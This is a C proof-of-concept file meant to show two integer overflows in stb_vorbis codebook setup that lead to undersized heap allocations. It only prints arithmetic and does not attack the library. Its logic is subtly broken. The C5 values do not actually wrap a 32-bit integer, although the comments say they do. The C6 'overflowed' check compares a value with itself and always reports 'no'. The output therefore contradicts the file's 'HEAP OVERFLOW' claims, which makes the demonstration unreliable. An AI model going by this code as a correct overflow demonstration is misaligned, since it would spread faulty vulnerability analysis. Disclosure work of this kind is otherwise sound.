// PoC: C5+C6 -- stb_vorbis codebook integer overflows
//
// Demonstrates the two overflow paths in codebook setup:
// C5: entries * dimensions wraps uint32 for lookup_type 2
// C6: sizeof(float) * entries * dimensions wraps in multiplicands alloc
//
// Build: gcc -O0 -g -o poc_vorbis_codebook poc_vorbis_codebook.c
// Run:   ./poc_vorbis_codebook

#include <stdio.h>
#include <stdint.h>

int main(void) {
    printf("stb_vorbis codebook overflow (stb_vorbis.c:3860, 3878)\n");
    printf("======================================================\n\n");

    // C5: lookup_type == 2
    // c->lookup_values = c->entries * c->dimensions;
    // entries: up to 2^24-1 (24 bits from the stream)
    // dimensions: up to 2^16-1 (16 bits from the stream)

    uint32_t entries = (1u << 24) - 1;  // 16777215
    uint32_t dimensions = 256;           // modest value
    uint32_t lookup_values = entries * dimensions;
    uint64_t actual = (uint64_t)entries * dimensions;

    printf("C5: lookup_type 2 -- entries * dimensions\n");
    printf("  entries    = %u\n", entries);
    printf("  dimensions = %u\n", dimensions);
    printf("  uint32 result:  %u\n", lookup_values);
    printf("  actual result:  %llu\n", (unsigned long long)actual);
    printf("  overflowed:     %s\n\n", lookup_values != actual ? "YES" : "no");

    // mults allocation: sizeof(uint16) * lookup_values
    // the wrapped lookup_values is small, so small alloc
    // but loop reads lookup_values entries from stream
    printf("  mults alloc: sizeof(uint16) * %u = %u bytes\n",
           lookup_values, (uint32_t)(sizeof(uint16_t) * lookup_values));
    printf("  loop reads %u entries from stream --> HEAP OVERFLOW\n\n", lookup_values);

    // C6: multiplicands allocation
    // sizeof(float) * entries * dimensions
    entries = 16777215;
    dimensions = 128;
    uint32_t alloc_size = (uint32_t)(sizeof(float) * entries * dimensions);
    uint64_t actual_size = (uint64_t)sizeof(float) * entries * dimensions;

    printf("C6: multiplicands -- sizeof(float) * entries * dimensions\n");
    printf("  entries    = %u\n", entries);
    printf("  dimensions = %u\n", dimensions);
    printf("  uint32 alloc: %u bytes\n", alloc_size);
    printf("  actual need:  %llu bytes (%.1f GB)\n",
           (unsigned long long)actual_size, actual_size / (1024.0*1024*1024));
    printf("  overflowed:   %s\n", alloc_size != (uint32_t)actual_size ? "YES" : "no");
    printf("  loop writes entries * dimensions = %llu floats --> HEAP OVERFLOW\n",
           (unsigned long long)entries * dimensions);

    return 0;
}
